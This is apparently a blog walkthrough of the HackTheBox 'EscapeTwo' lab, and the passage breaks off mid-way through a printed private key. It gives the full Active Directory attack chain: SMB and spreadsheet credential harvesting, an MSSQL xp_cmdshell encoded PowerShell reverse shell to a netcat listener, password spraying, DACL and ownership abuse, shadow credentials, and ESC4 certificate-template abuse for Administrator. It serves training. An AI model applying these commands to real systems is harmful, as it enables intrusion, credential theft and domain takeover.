<div class="banner">
    <div class="ads">
        <span></span>
        Get Free - Docs template
    </div>
    <h1>
        <span>¿By Vishok - Hacking Pentesting?</span>
        EscapeTwo HTB
    </h1>
</div>

####
####
####
## Open ports in the target machine
### Nmap
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="tip">

> Is time to perfom a scan using **nmap** to discover a treasure. 
</div>

####
```ruby
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49691/tcp open  unknown
49700/tcp open  unknown
49720/tcp open  unknown
49732/tcp open  unknown
49799/tcp open  unknown
```
####
How are many ports, is a little tedious insert one to one port in a new line to make a new scan to discover the services, so I use this approach to make easier the work:
####
```ruby
echo '
    53/tcp    open  domain
    88/tcp    open  kerberos-sec
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    1433/tcp  open  ms-sql-s
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    5985/tcp  open  wsman
    9389/tcp  open  adws
    47001/tcp open  winrm
    49664/tcp open  unknown
    49665/tcp open  unknown
    49666/tcp open  unknown
    49667/tcp open  unknown
    49687/tcp open  unknown
    49688/tcp open  unknown
    49691/tcp open  unknown
    49700/tcp open  unknown
    49720/tcp open  unknown
    49732/tcp open  unknown
    49799/tcp open  unknown
' | grep -oE '^([0-9])+' | sed -z 's/\n/,/g'
```
####
| Grep and sed param | Description |
| ----- | ----- |
| -o | Make unique matches |
| -E | Find other results into a unique string |
| -z | Separate lines for each null character, is used to sustitute |
| s/ | Especify the start of the sustitution |
| /g | Especify the end of the sustitution |
####
Result of the nmap scan:
####
```ruby
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-03 21:29:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T21:30:46+00:00; +52m39s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-02T17:00:27
|_Not valid after:  2026-05-02T17:00:27
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-02T17:00:27
|_Not valid after:  2026-05-02T17:00:27
|_ssl-date: 2025-05-03T21:30:45+00:00; +52m39s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-05-03T21:30:46+00:00; +52m40s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-02T09:11:24
|_Not valid after:  2055-05-02T09:11:24
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-02T17:00:27
|_Not valid after:  2026-05-02T17:00:27
|_ssl-date: 2025-05-03T21:30:46+00:00; +52m39s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T21:30:46+00:00; +52m40s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-02T17:00:27
|_Not valid after:  2026-05-02T17:00:27
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
49799/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
####
####
####
## Services that is running in target machine
### SMB
So this machine have many ports, many services, so is many information to analyse. The Hackthebox give us a credentials simulating a real pentest environment, so we can use this credentials to connect to the target machine. The credentials are: `rose:KxEPkKe6R8su`. The port *5985* is open, so we can use this port to connect to the target machine using **evil-winrm**, but this is not possible. But there are other services: [*SMB*, *LDAP*].
####
Having a valid credentials, we could try to enumerate a shared resources using **netexec**:
####
```ruby
netexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su --shares
    Result ->
        SMB    10.10.11.51    445    DC01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
        SMB    10.10.11.51    445    DC01     [+] sequel.htb\rose:KxEPkKe6R8su 
        SMB    10.10.11.51    445    DC01     [*] Enumerated shares
        SMB    10.10.11.51    445    DC01     Share           Permissions     Remark
        SMB    10.10.11.51    445    DC01     -----           -----------     ------
        SMB    10.10.11.51    445    DC01     Accounting Department READ            
        SMB    10.10.11.51    445    DC01     ADMIN$                          Remote Admin
        SMB    10.10.11.51    445    DC01     C$                              Default share
        SMB    10.10.11.51    445    DC01     IPC$            READ            Remote IPC
        SMB    10.10.11.51    445    DC01     NETLOGON        READ            Logon server share 
        SMB    10.10.11.51    445    DC01     SYSVOL          READ            Logon server share 
        SMB    10.10.11.51    445    DC01     Users           READ            
```
####
We can see 2 resources that are interesting: **Accounting Department** and **Users**. We could try to gain access using *SMB*. Exist a tool for this: **smbclient**. The Users resource is empty, we have only left **Accounting Department**:
####
```ruby
smbclient '//10.10.11.51/Accounting Department' -U rose%KxEPkKe6R8su
```
####
| Smbclient param | Description |
| ----- | ----- |
| -U | Pass the credentials in format: `username%password` |
####
At the moment to gain access an enter into *SMB*, we can use the Windows or Linux commands to move into this *CLI*. Listing the content we are able to see 2 files: `accounting_2024.xlsx` and `accounts.xlsx`. To see the content of those files, is necessary download it in our machine, the command to download files is `get`.
####
```ruby
get accounting_2024.xlsx
get accounts.xlsx
```
####
After download the files, we can open it using **LibreOffice**, **Excel**, or simply read the content using **cat**. If we try to see the content using grafix tools, we are able to see that the files are **corrupted**.
####
<div class="img">
    <img src="/machines/public/escapetwo/1.png" loading="lazy" decoding="async" />
</div> 

####
If we try to discover what is the reason why the files are corrupted, we can use **strings** to read the content of the files, but the content is unreadable. Exist online tools to repair files like: [Office-Recovery](https://online.officerecovery.com/filerepair/status).
####
<div class="img">
    <img src="/machines/public/escapetwo/2.png" loading="lazy" decoding="async" />
</div> 

####
The repearing not work because delete the mayority content. We need other focus:
####
```ruby
file accounting_2024.xlsx
    Result -> 
        accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate
```
####
Both files are a *ZIP* files, so we can extract the content of the files using **unzip**. The file that report us something interesting in the **accounts.xlsx** file, specifically in the `xl` directory. Exist one file `sharedStrings.xml` that posses a credentials.
####
```ruby
cd xl
xmllint --format sharedStrings.xml
```
####
The output is very difficult to read, exist a tool to see the **xml** files more beautifull, **xmllint** could help us here, but is difficult to read yet. We could try use other focus using tools like **sed** and **awk**. The data is more easy to so:
####
```ruby
xmllint --format sharedStrings.xml | sed -z 's/<si>/ /g' | sed -z 's/<\/si>/ /g' | sed -z 's/<t xml:space="preserve">/<th>/g' | sed -z 's/<\/t>/<\/th>/g' | grep "<th>" | sed 's/<th>//g; s/<\/th>//g' > dataParse.txt
```
####
| Sed param | Description |
| ----- | ----- |
| -z | Separate lines for each null character, is used to sustitute |
| s/ | Especify the start of the sustitution |
| /g | Especify the end of the sustitution |
####
<div class="info">

> Is time to craft our custom script to parse date for read the content more easy.
</div>

####
```python
#!/usr/bin/python3
import os

def main():
    parse_awk = r'''
        BEGIN {
            print "======================================================================================================================"
            printf "%-20s %-20s %-25s %-20s %-25s \n", "First_name", "Last_name", "Email", "Username", "Password"
            print "======================================================================================================================"
        } {
            if(NR%5 == 1) { a=$0 }
            if(NR%5 == 2) { b=$0 }
            if(NR%5 == 3) { c=$0 }
            if(NR%5 == 4) { d=$0 }
            if(NR%5 == 0) { 
                e=$0
                printf "%-20s %-20s %-25s %-20s %-25s \n", a, b, c, d, e
            }
        } END {
            print "======================================================================================================================"
        }
    '''

    os.system(f"cat dataParse.txt | awk '{parse_awk}'")

if __name__ == '__main__':
    main()
```
####
| Awk param | Description |
| ----- | ----- |
| BEGIN | Block executed before processing any input lines (*Initialization*) |
| END | Block executed after all input lines are processed (*Finalization*) |
| NR | Built-in variable: current input record (*Line*) number |
| $0 | Entire current input line |
| printf | Prints formatted output |
| if(condition) | Conditional statement to execute code if condition is true |
| % | Modulo operator, used to group lines e.g. *NR%5* |
| { ... } | Action block, code to execute for each line or condition |
| a, b, c, d, e | Variables used to temporarily store each field/line |
####
The output is this:
####
```ruby
python3 parse.py
    Result -> 
        ======================================================================================================================
        First_name           Last_name            Email                     Username             Password                  
        ======================================================================================================================
            First Name           Last Name            Email                     Username             Password              
            Angela               Martin               angela@sequel.htb         angela               0fwz7Q4mSpurIt99      
            Oscar                Martinez             oscar@sequel.htb          oscar                86LxLBMgEWaKUnBG      
            Kevin                Malone               kevin@sequel.htb          kevin                Md9Wlq1E5bZnVDVo      
        ======================================================================================================================
```
####
Is necessary that the final if will be executed changed the column numbers: `if(NR%5 == 0)` to `if(NR%4 == 0)` to see the final credentials, because this credential no posses a **Last_name** so is not a *5* module. After that, we have more credentials, so we could try to see if some of this user is valid to connect in the target machine using the *5985* port, **evil-winrm** help us here. But nothing user is in the *Windows Remote Management* group. The *1433* port is open, we can see this in nmap scan and is running a *MSSQL*.
####
####
####
## First explotation phase
### MSSQL
So in the previous output parte data we saw a credential related with that service: `sa:MSSQLP@ssw0rd!`, so we could try ro connect at this service using **impacket**.
####
```ruby
impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
```
####
The *MSSQL* have a specifique form to enumerate things, this service have a way to execute commands in the target machine.
####
<div class="info">

> **xp_cmdshell** command execution is a powerful technique available to penetration testers targeting Microsoft SQL Server environments. Microsoft introduced xp_cmdshell with T-SQL in **SQL Server 6.0** (1995) as part of the extended stored procedures, allowing users to execute operating system commands directly from SQL Server.
</div>

####
I found a article that explain very well how to gain access in Windows machine using that command, the article is this: [MSSQL-Command-Execute-XP-Cmdshell](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/). The article explain that is necessary enable the command execution: `EXEC sp_configure 'xp_cmdshell', 1;` and save configuration with `Reconfigure`.
####
The *One-liner* will be a Powershell command with **rlwrap** listener.
####
<div class="img">
    <img src="/machines/public/escapetwo/3.png" loading="lazy" decoding="async" />
</div> 

####
```ruby
In MSSQL-Client ->
1. EXEC sp_configure 'xp_cmdshell', 1;
2. RECONFIGURE;
3. xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE...

In our machine ->
rlwrap nc -nlvp 1234
```
####
Our user `sql_svc` don't have the user flag, so if we see the users in `C:\Users`, we are able to see a **ryan** user. So that suggest that we need to convert in ryan user. Exploring in the target machine in the main path: `C:\` exist a directory named *SQL2019*. Entering with deep into this directory we can se several files:
####
```ruby
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/8/2024   3:07 PM                1033_ENU_LP
d-----         6/8/2024   3:07 PM                redist
d-----         6/8/2024   3:07 PM                resources
d-----         6/8/2024   3:07 PM                x64
-a----        9/24/2019  10:03 PM             45 AUTORUN.INF
-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML
-a----         6/8/2024   3:07 PM             16 PackageId.dat
-a----        9/24/2019  10:03 PM         142944 SETUP.EXE
-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG
-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI
-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL
```
####
Almost always the config files have credentials, so if we read that file: `type sql-Configuration.INI`.
####
```ruby
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```
####
Here there other credential, we don't now for which user work this password `WqSZAF6CysDQbGb3`, so to determine for which user work this password, we can create a password and user dicctionary to prove that credentials with **netexec** for [*MSSQL*, *LDAP*, *SMB*] services that is running in the target machine.
####
```ruby
netexec winrm 10.10.11.51 -u users.txt -p pass.txt
    Result ->
        WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\kevin:0fwz7Q4mSpurIt99
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\angela:86LxLBMgEWaKUnBG
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\oscar:86LxLBMgEWaKUnBG
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\kevin:86LxLBMgEWaKUnBG
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\angela:Md9Wlq1E5bZnVDVo
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\oscar:Md9Wlq1E5bZnVDVo
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\angela:WqSZAF6CysDQbGb3
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3
        WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\kevin:WqSZAF6CysDQbGb3
        WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
```
####
| Netexec param | Description |
| ----- | ----- |
| -u | Specify a user or users file |
| -p | Specify a password or password file |
####
That credential work for **ryan** user, so here we will use the **evil-winrm** tool.
####
```ruby
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```
####
| Evil-winrm param | Description |
| ----- | ----- |
| -i | Specify the ip target host |
| -u | Specify the user |
| -p | Specify the password |
####
####
####
## Second exploit phase (Privilage Escalation)
### WriteOwner
If we execute a **bloodhound-python** in our machine aginst the target machine to discover a potential vector of explotation, we are able to see that the user `ryan` have *WriteOwner* permissions over `ca_svc`. So the **impacket** suite have 2 tools that will help us to exploit this aproach because the `ca_svc` user is the other unique user, so the privilage escalation is for here.
####
First, we need to change the **ownership** `ca_svc` account. The user that we posses credentials to gain access in the target machine is **ryan** and he have that permissions so we will try to be the owner of that account.
####
```ruby
python3 impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
    Result -> 
        [*] Current owner information below
        [*] - SID: S-1-5-21-548670397-972687484-3496335370-512
        [*] - sAMAccountName: Domain Admins
        [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
        [*] OwnerSid modified successfully!
```
####
| Impacket-owneredir param | Description |
| ----- | ----- |
| -action | Specifies the action to perform. Valid options: [*Read*, *Write*, *Restore*] |
| -new-owner | Specifies the new owner of the target object. |
| -target | Specifies the target object to modify |
####
Now we need to specify what level of control or permissions, impacket have a tool based on DACL [*Discretionary Access Control List*]. If we will have a **full control** in this account when we spawn, we will spawned like a super user.
####
```ruby
python3 impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
    Result -> 
        [*] DACL backed up to dacledit-20250506-141031.bak
        [*] DACL modified successfully!
```
####
| Impacket-dacleedit | Description | 
| ----- | ----- |
| -rights | Specify the rights or permissions that the new user will have |
| -principal | Sepecify the user |
####
We already achieve to take control over the **ca_svc** user. Now we need to get the credentials. In this case the **certipy** tool take place for linux and **certify** for windows, the form to install the first tool is: `pip install certipy --break-system-packages`, the other tool you can download it in github: [Certify-Exe-File](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).
####
```ruby
certipy shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
    Result -> 
        [*] Targeting user 'ca_svc'
        [*] Generating certificate
        [*] Certificate generated
        [*] Generating Key Credential
        [*] Key Credential generated with DeviceID '235e9e44-e591-e63a-d2bf-c5a3b58624e9'
        [*] Adding Key Credential with device ID '235e9e44-e591-e63a-d2bf-c5a3b58624e9' to the Key Credentials for 'ca_svc'
        [*] Successfully added Key Credential with device ID '235e9e44-e591-e63a-d2bf-c5a3b58624e9' to the Key Credentials for 'ca_svc'
        [*] Authenticating as 'ca_svc' with the certificate
        [*] Using principal: ca_svc@sequel.htb
        [*] Trying to get TGT...
        [-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
        [*] Restoring the old Key Credentials for 'ca_svc'
        [*] Successfully restored the old Key Credentials for 'ca_svc'
        [*] NT hash for 'ca_svc': None
```
####
| Certipy param | Description | 
| ----- | ----- |
| shadow| Abuse Shadow Credentials for account takeover |
| -u | Specify a user |
| -p | Specify a password |
| -account | Specify a account when we are try to ownership |
####
How you can see in previous output that **certipy** command don't work, in this web site there is a page dedicated to cover the *Clock Skew Too Great* Kerberos error. The most factivle solution is use **faketime**. For this, is necessary firstly, get the current date of the target machine executing `date` like **ryan** into the evil-winrm session or use a **ntpdate**
####
```ruby
date
    Result -> 
        Tuesday, May 6, 2025 3:07:50 PM

ntpdate sequel.htb
    Result ->
        2025-05-06 15:12:02.237340 (-0700) +3181.036456 +/- 0.059572 sequel.htb 10.10.11.51 s1 no-leap
        CLOCK: step_systime: Operation not permitted
```
####
The **ntpdate** is most factible because give us the exact date format that **faketime** need.
####
```ruby
faketime "2025-05-06 15:12:02" certipy shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
    Result ->
        [*] Targeting user 'ca_svc'
        [*] Generating certificate
        [*] Certificate generated
        [*] Generating Key Credential
        [*] Key Credential generated with DeviceID '539d3fff-fe44-1ee7-7efc-8959dd8b8e71'
        [*] Adding Key Credential with device ID '539d3fff-fe44-1ee7-7efc-8959dd8b8e71' to the Key Credentials for 'ca_svc'
        [*] Successfully added Key Credential with device ID '539d3fff-fe44-1ee7-7efc-8959dd8b8e71' to the Key Credentials for 'ca_svc'
        [*] Authenticating as 'ca_svc' with the certificate
        [*] Using principal: ca_svc@sequel.htb
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saved credential cache to 'ca_svc.ccache'
        [*] Trying to retrieve NT hash for 'ca_svc'
        [*] Restoring the old Key Credentials for 'ca_svc'
        [*] Successfully restored the old Key Credentials for 'ca_svc'
        [*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```
####
Now we have a hash and we need to discover a template to exploit a try to gain access.
####
```ruby
certipy find -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable
    Result ->
        Certificate Templates
        Template Name                       : DunderMifflinAuthentication
        Display Name                        : Dunder Mifflin Authentication
        Certificate Authorities             : sequel-DC01-CA
        Enabled                             : True
        Client Authentication               : True
        Enrollment Agent                    : False
        Any Purpose                         : False
        Enrollee Supplies Subject           : False
        Certificate Name Flag               : SubjectRequireCommonName
                                            SubjectAltRequireDns
        Enrollment Flag                     : AutoEnrollment
                                            PublishToDs
        Extended Key Usage                  : Client Authentication
                                            Server Authentication
        Requires Manager Approval           : False
        Requires Key Archival               : False
        Authorized Signatures Required      : 0
        Validity Period                     : 1000 years
        Renewal Period                      : 6 weeks
        Minimum RSA Key Length              : 2048
        Permissions
        Enrollment Permissions
            Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Enterprise Admins
        Object Control Permissions
            Owner                           : SEQUEL.HTB\Enterprise Admins
            Full Control Principals         : SEQUEL.HTB\Cert Publishers
            Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Enterprise Admins
                                            SEQUEL.HTB\Administrator
                                            SEQUEL.HTB\Cert Publishers
            Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Enterprise Admins
                                            SEQUEL.HTB\Administrator
                                            SEQUEL.HTB\Cert Publishers
            Write Property Principals       : SEQUEL.HTB\Domain Admins
                                            SEQUEL.HTB\Enterprise Admins
                                            SEQUEL.HTB\Administrator
                                            SEQUEL.HTB\Cert Publishers
        [!] Vulnerabilities
        ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```
####
<div class="info">

> **ESC4** abuses the Key Credentials property of Active Directory accounts, allowing an attacker to authenticate as another user using a certificate-based authentication bypass.
</div>

####
We need to try to enable that vulnerable template in the target machine *DunderMifflinAuthentication*.
####
```ruby
KRB5CCNAME=$PWD/ca_svc.ccache faketime "2025-05-06 15:24:37" certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
    Result ->
        [*] Updating certificate template 'DunderMifflinAuthentication'
        [*] Successfully updated 'DunderMifflinAuthentication'
```
#### 
Is necessary execute the `date` or `ntpdate sequel.htb` each time that you execute a command that present the Kerberos clock error. All this proccess must be do very fast because so time the machine **return** ownership to **ca_svc** user.
####
The next is get a **pfx** authenticated file:
####
```ruby
faketime "2025-05-06 15:30:35" certipy req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
    Result ->
        [+] Trying to resolve 'sequel.htb' at '10.10.11.51'
        [+] Generating RSA key
        [*] Requesting certificate via RPC
        [+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
        [+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
        [-] Got error while trying to request certificate: code: 0x8009480f - CERTSRV_E_SUBJECT_DNS_REQUIRED - The Domain Name System (DNS) name is unavailable and cannot be added to the Subject Alternate name.
        [*] Request ID is 27
        Would you like to save the private key? (y/N) y
        [*] Saved private key to 27.key
        [-] Failed to request certificate
```
####
In my case this aproach don't work, the key is generated in my machine, but only with key i can't achive nothing, so other aproach is use **certify** in the target machine, uploading the file using the evil-winrm session `upload Certify.exe`, we can execute the next command:
####
```ruby
Certify.exe request /ca:DC01.sequel.htb\sequel-DC01-CA /template:DunderMifflinAuthentication /altname:Administrator
    Result ->
          _____          _   _  __
         / ____|        | | (_)/ _|
        | |     ___ _ __| |_ _| |_ _   _
        | |    / _ \ '__| __| |  _| | | |
        | |___|  __/ |  | |_| | | | |_| |
         \_____\___|_|   \__|_|_|  \__, |
                                    __/ |
                                   |___./
        v1.0.0

        [*] Action: Request a Certificates

        [*] Current user context    : SEQUEL\ryan
        [*] No subject name specified, using current context as subject.

        [*] Template                : DunderMifflinAuthentication
        [*] Subject                 : CN=Ryan Howard, CN=Users, DC=sequel, DC=htb
        [*] AltName                 : Administrator

        [*] Certificate Authority   : DC01.sequel.htb\sequel-DC01-CA

        [*] CA Response             : The certificate had been issued.
        [*] Request ID              : 25

        [*] cert.pem         :

        -----BEGIN RSA PRIVATE KEY-----
        MIIEpQIBAAKCAQEAywmmx2jyWYtZDaxTnMOgVw5lYSFsQnp0SQ8saRvrctKtTf6r
        zFJQoP5okLP/rxfb4tetWgv21zFa3EJzqlxMN7fzEkh0GSK9HZvIBCRhlFcFf1MD
        4T0K1i+VONxc250BrSe58cFolHV5UU/nJCjH5Gz2cWDltwJuvisJyQH8RFD8kZSw
        VNPfs3AHE3kItFtAqiJHtZ2gTxZT3SLWzHUaXYlAhe3nXEg13gjUABWwevH467gd
        op+JuC7LGaHX9WQUJzwN4Oe92Pl39CT6ZIPiUjPrlblEGYOM1xhBYDZ1QFra5i9z
        Afllk5HiK6vQsuj7Fn74C+W01jDRQpTbwRmpdQIDAQABAoIBAQDJFsoDfcFpRkXw
        8NfuzyGilzN5O60JOlapdUm64FgU5OuX778fIfeRO+c8ScnWFH9G7+1U3byf7NXc
        iEQeWkNye9FWLkQuEOXUyVEUKSQr0vQy4nlZPyfYclAMfNPK/nmGkW3sLm3xe1eo
        XMbEXU98wR5jtGBPHS2pUt7iIgFDdl5/ErGQHEcMqF5T9mG3u95PaK34v84vsZz8
        U2NhxHocpLG6Ff8daDS7cOCbTngEGa4FJT+St8lvcfMTUu7HZwoFRc92UHlFA7RO
        +AVQ22wTyCp9kAcDYj3BkGJ1o29SOW0zrrgCM65bqnyy5jfAH2fwEEe0bd9pu99w
        VJgWPBeRAoGBAOz2v+KyDo22rWhIqlE1uVkFjlXpiG0YjcUbGW4tXIf1RVI3xZo2
        XbVy6Ne9wMDGviNlh8lmZ414SGX5zFoFu/xT2h8AtuGu/dhxvJal+WrBzU+JCwI1
        3KFGqV8cFUdX1qn+3QmF9NFXKuHv91hGrNr2EJNOzsy+qIdll7UDbDsHAoGBANtZ
        MpscBOrWyg4LZHEb2f8zFozO6l82+df7uo99Scc8vlxFInGT4O7ORZh5XNvQ2Gcc
        gc9mZBRDlAiPfWO0+lQjBXdOwCQQ4REKPUWv7eKDjtyFGyh13FV0Y/NsMZEmTwcP
        kTfdX7c+8GDfYxYgw9T4mHQmLyOyJEdaoVUUhkyjAoGBALA/o19QwoRjMD1VduCq
        Te7JtCFwbpl+XswRKOwK7zzskB/j/aSC9VYlXsxAhaKc8AVR2hpRgYn2whqfHoCC
        rVyzXZQbqurXhlU722JNluLxvOyAaOC/ARgvf4CPWcBTtAWC3BLeQMaHyAx+uIE/
        KAhAZvm57xTYZm82gA0Ru6l3AoGAKn4lJ5dN/JCPpBjg5GiY2q9y9uQ+0yM7U3QY
        uCN1X3uNBSL/gTE8qgabxOX97zeONKt5GkyjpqlQzDe/+sjcleAS9wHyhwoeD8cE
